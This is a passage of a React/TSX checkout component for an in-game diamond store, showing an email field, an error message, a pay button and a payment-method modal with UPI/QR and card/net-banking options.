                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Email Address
                </label>
                <input
                  type="email"
                  placeholder="your@email.com"
                  value={form.email}
                  onChange={e => setForm(prev => ({ ...prev, email: e.target.value }))}
                  onFocus={() => setFocusedField('email')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'email' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'email' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              {error && (
                <div style={{
                  marginTop: 12, padding: '10px 14px',
                  background: '#fff5f5', border: '1px solid #fed7d7',
                  borderRadius: 8, color: '#e53e3e',
                  fontSize: 13, fontWeight: 600
                }}>
                  ⚠️ {error}
                </div>
              )}
            </div>

            {/* PAY NOW BUTTON */}
            {form.name.trim() && form.phone.trim() && form.email.trim() && (
              <button
                onClick={() => { setShowPayModal(true); }}
                disabled={loading}
                style={{
                  width: '100%',
                  padding: isMobile ? '16px' : '18px',
                  background: loading ? '#ccc' : 'linear-gradient(135deg, #ee2c24, #c0392b)',
                  color: 'white',
                  border: 'none',
                  borderRadius: 14,
                  fontSize: isMobile ? 15 : 16,
                  fontWeight: 800,
                  cursor: loading ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: 8,
                  boxShadow: loading ? 'none' : '0 6px 20px rgba(238,44,36,0.35)',
                  letterSpacing: '0.3px',
                  WebkitTapHighlightColor: 'transparent',
                  touchAction: 'manipulation',
                  outline: 'none',
                  marginTop: 4,
                }}
              >
                {loading ? '⏳ Processing…' : `🔒 Pay ₹${pkg}`}
              </button>
            )}

            {/* PAYMENT METHOD SELECTION MODAL */}
            {showPayModal && (
              <div
                onClick={() => setShowPayModal(false)}
                style={{
                  position: 'fixed', inset: 0, zIndex: 1000,
                  background: 'rgba(0,0,0,0.55)',
                  display: 'flex', alignItems: 'flex-end', justifyContent: 'center',
                }}
              >
                <div
                  onClick={e => e.stopPropagation()}
                  style={{
                    background: 'white',
                    borderRadius: '20px 20px 0 0',
                    padding: isMobile ? '24px 16px 36px' : '28px 28px 40px',
                    width: '100%', maxWidth: 480, boxSizing: 'border-box',
                  }}
                >
                  <div style={{ width: 36, height: 4, background: '#e0e0e0', borderRadius: 4, margin: '0 auto 20px' }} />

                  <div style={{ textAlign: 'center', marginBottom: 22 }}>
                    <div style={{ fontSize: 17, fontWeight: 900, color: '#111', letterSpacing: -0.3 }}>
                      Choose Payment Method
                    </div>
                    <div style={{ fontSize: 12, color: '#aaa', marginTop: 4, fontWeight: 500 }}>
                      Fast · Secure · Instant Diamond Credit
                    </div>
                  </div>

                  {/* Option 1 — UPI / QR */}
                  <button
                    onClick={() => handlePay('QR')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 12,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://play-lh.googleusercontent.com/yHTP3WYAPWUydt6zFfhpEUmKWBVJ5PLF7QHlwYy95WclJZwVm2TPKekK1OruO-T5IeuvnMcF6x-MU7F8iR8hkw=w480-h960-rw"
                        alt="GPay" style={{ height: 20, width: 20, objectFit: 'contain', borderRadius: 4, flexShrink: 0 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1920px-PhonePe_Logo.svg.png"
                        alt="PhonePe" style={{ height: 18, objectFit: 'contain', flexShrink: 0, maxWidth: 52 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28standalone%29.svg/1920px-Paytm_Logo_%28standalone%29.svg.png"
                        alt="Paytm" style={{ height: 16, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR Code</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm · QR Scan</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  {/* Option 2 — Card / Net Banking */}
                  <button
                    onClick={() => handlePay('ALL')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 20,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/UPI_logo.svg/1920px-UPI_logo.svg.png"
                        alt="UPI" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 36 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/1920px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png"
                        alt="Visa" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1920px-Mastercard-logo.svg.png"
                        alt="MC" style={{ height: 22, objectFit: 'contain', flexShrink: 0, maxWidth: 28 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Card / Net Banking</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>Credit Card · Debit Card · Netbanking</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  <div style={{ textAlign: 'center', fontSize: 11, color: '#aaa', fontWeight: 500 }}>
                    🔒 100% Secure · SSL Encrypted · Powered by Free Fire Store
                  </div>
                </div>
              </div>
            )}
          </div>

        </div>
      </div>
    </div>
  );
}
